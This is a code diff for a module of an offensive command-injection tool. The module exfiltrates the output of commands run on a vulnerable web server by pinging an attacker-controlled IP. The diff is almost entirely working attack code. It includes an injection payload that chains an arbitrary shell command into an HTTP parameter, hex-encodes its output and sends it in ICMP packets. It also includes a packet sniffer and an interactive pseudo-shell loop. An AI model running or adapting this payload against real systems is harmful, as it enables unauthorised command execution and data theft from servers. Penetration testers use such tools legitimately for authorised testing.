@@ -57,24 +57,30 @@ except ImportError:
       readline_error = True
   pass
 
-
 """
 The ICMP exfiltration technique: 
-exfiltrate data using the ping utility.
+Exfiltrate data using the ping utility.
 
 [1] http://blog.ring-zer0.com/2014/02/data-exfiltration-on-linux.html
 [2] http://blog.curesec.com/article/blog/23.html
 """
 
+add_new_line = True
+exfiltration_length = 8
+
 def packet_handler(Packet):
+  global add_new_line
   if Packet.haslayer(ICMP):
     Data = Packet.getlayer(ICMP).getlayer(Raw)
-    sys.stdout.write(Data.load[8:])
+    exfiltrated_data = Data.load[int(exfiltration_length):].replace(exfiltration_length * "\n","\n")
+    if exfiltrated_data.endswith("\n"):
+      add_new_line = False
+    sys.stdout.write(exfiltrated_data)
     sys.stdout.flush()
 
-
 def signal_handler(signal, frame):
-  os._exit(0)
+  sys.stdout.write(Style.RESET_ALL)
+  exit(0)
 
 def snif(ip_dst, ip_src):
   success_msg = "Started the sniffer between " + Fore.YELLOW + ip_src
@@ -86,12 +92,16 @@ def snif(ip_dst, ip_src):
     sniff(filter = "icmp and src " + ip_dst, prn=packet_handler, timeout=settings.DELAY)
  
 def cmd_exec(http_request_method, cmd, url, vuln_parameter, ip_src):
+  global add_new_line
   # ICMP exfiltration payload.
-  payload = ("; " + cmd + " | xxd -p -c 16 | while read line; do ping -p $line -c 1 -s16 -q " + ip_src + "; done")
+  payload = ("; " + cmd + " | xxd -p -c" + str(exfiltration_length) + " | while read line; do ping -p $line -c1 -s" + str(exfiltration_length * 2) + " -q " + ip_src + "; done")
   
   # Check if defined "--verbose" option.
   if settings.VERBOSITY_LEVEL >= 1:
-    sys.stdout.write("\n" + settings.print_payload(payload))
+    info_msg = "Executing the '" + cmd + "' command... "
+    sys.stdout.write("\n" + settings.print_info_msg(info_msg))
+    sys.stdout.flush()
+    sys.stdout.write("\n" + settings.print_payload(payload) + "\n")
 
   if http_request_method == "GET":
     url = url.replace(settings.INJECT_TAG, "")
@@ -101,12 +111,16 @@ def cmd_exec(http_request_method, cmd, url, vuln_parameter, ip_src):
     values =  {vuln_parameter:payload}
     data = urllib.urlencode(values)
     req = urllib2.Request(url=url, data=data)
-    
+  
   sys.stdout.write(Fore.GREEN + Style.BRIGHT + "\n")
   response = urllib2.urlopen(req)
-  time.sleep(2)
-  sys.stdout.write("\n" + Style.RESET_ALL)
-  print ""
+  time.sleep(3)
+  sys.stdout.write(Style.RESET_ALL)
+  if add_new_line:
+    print "\n"
+    add_new_line = True
+  else:
+    print ""  
   
 def input_cmd(http_request_method, url, vuln_parameter, ip_src, technique):
 
@@ -167,23 +181,17 @@ def input_cmd(http_request_method, url, vuln_parameter, ip_src, technique):
           else:
             # Command execution results.
             cmd_exec(http_request_method, cmd, url, vuln_parameter, ip_src)
-
         except KeyboardInterrupt:
-          print ""
-          os._exit(0)
-          
+          os._exit(1)
         except:
           print ""
           os._exit(0)
-
     elif gotshell in settings.CHOICE_NO:
       print ""
       os._exit(0)
-
     elif gotshell in settings.CHOICE_QUIT:
       print ""
       os._exit(0)
-
     else:
       err_msg = "'" + gotshell + "' is not a valid answer."
       print settings.print_error_msg(err_msg)
@@ -202,7 +210,6 @@ def exploitation(ip_dst, ip_src, url, http_request_method, vuln_parameter, techn
   else:
     input_cmd(http_request_method, url, vuln_parameter, ip_src, technique)
 
-
 def icmp_exfiltration_handler(url, http_request_method):
   # You need to have root privileges to run this script
   if os.geteuid() != 0:
@@ -212,9 +219,9 @@ def icmp_exfiltration_handler(url, http_request_method):
 
   if http_request_method == "GET":
     #url = parameters.do_GET_check(url)
-    vuln_parameter = parameters.vuln_GET_param(url)
     request = urllib2.Request(url)
     headers.do_check(request)
+    vuln_parameter = parameters.vuln_GET_param(url)
     
   else:
     parameter = menu.options.data
@@ -297,3 +304,5 @@ def icmp_exfiltration_handler(url, http_request_method):
 
 if __name__ == "__main__":
   icmp_exfiltration_handler(url, http_request_method)
+
+#eof
